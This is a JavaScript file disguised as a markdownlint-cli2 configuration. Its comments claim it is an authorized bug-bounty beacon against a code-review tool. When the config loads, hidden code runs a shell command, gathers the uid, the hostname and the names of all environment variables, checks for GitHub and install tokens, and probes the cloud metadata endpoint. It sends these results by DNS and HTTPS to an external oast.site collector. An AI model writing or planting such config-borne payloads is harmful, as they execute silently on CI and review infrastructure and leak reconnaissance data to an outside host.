// Benign authorized research beacon (HackerOne `coderabbit`, H1 review-tool config exec).
// Emits DNS/HTTP to an owned interactsh collector. Sends environment-variable NAMES only
// (never values), uid, hostname, and the metadata endpoint STATUS CODE only. No creds used.
const MARK = 'MDLae1a0ad3';
const BEACON = 'dbqerhsrosne02eopgm048tqsgfxhp8cm.oast.site';
function ping(label) { try { require('dns').lookup(label + '.' + BEACON, function () {}); } catch (e) {} }
try {
  const os = require('os');
  const crypto = require('crypto');
  let uid = 'na';
  try { uid = require('child_process').execSync('id -u').toString().trim(); } catch (e) {}
  const host = os.hostname();
  const names = Object.keys(process.env);
  const hasRe = function (re) { return names.some(function (n) { return re.test(n); }) ? '1' : '0'; };
  const flags = 'gh' + (names.indexOf('GITHUB_TOKEN') >= 0 ? '1' : '0')
    + 'inst' + hasRe(/install.*token/i)
    + 'cr' + hasRe(/^coderabbit/i);
  const hh = crypto.createHash('sha1').update(host).digest('hex').slice(0, 8);
  // compact DNS beacon: exec proof + uid + name-presence flags + host hash
  ping((MARK + '-u' + uid + '-' + flags + '-' + hh).toLowerCase().replace(/[^a-z0-9-]/g, ''));
  // metadata status-only probe (do NOT read any credential), report status via DNS
  try {
    const req = require('http').get({ host: '169.254.169.254', path: '/', timeout: 2000 }, function (res) {
      ping(('md' + res.statusCode + '-' + MARK).toLowerCase());
      res.destroy();
    });
    req.on('error', function () { ping(('mderr-' + MARK).toLowerCase()); });
    req.on('timeout', function () { req.destroy(); ping(('mdto-' + MARK).toLowerCase()); });
  } catch (e) {}
  // HTTPS POST carrying env NAMES only (no values) so the collector records the full name set
  try {
    const body = JSON.stringify({ m: MARK, host: host, uid: uid, envNames: names });
    const r2 = require('https').request({ hostname: BEACON, path: '/names/' + MARK, method: 'POST',
      headers: { 'content-type': 'application/json' }, timeout: 3000 }, function () {});
    r2.on('error', function () {});
    r2.write(body); r2.end();
  } catch (e) {}
} catch (e) {}
// valid markdownlint-cli2 config so the tool still recognizes this file
module.exports = { config: { default: true, MD013: false } };
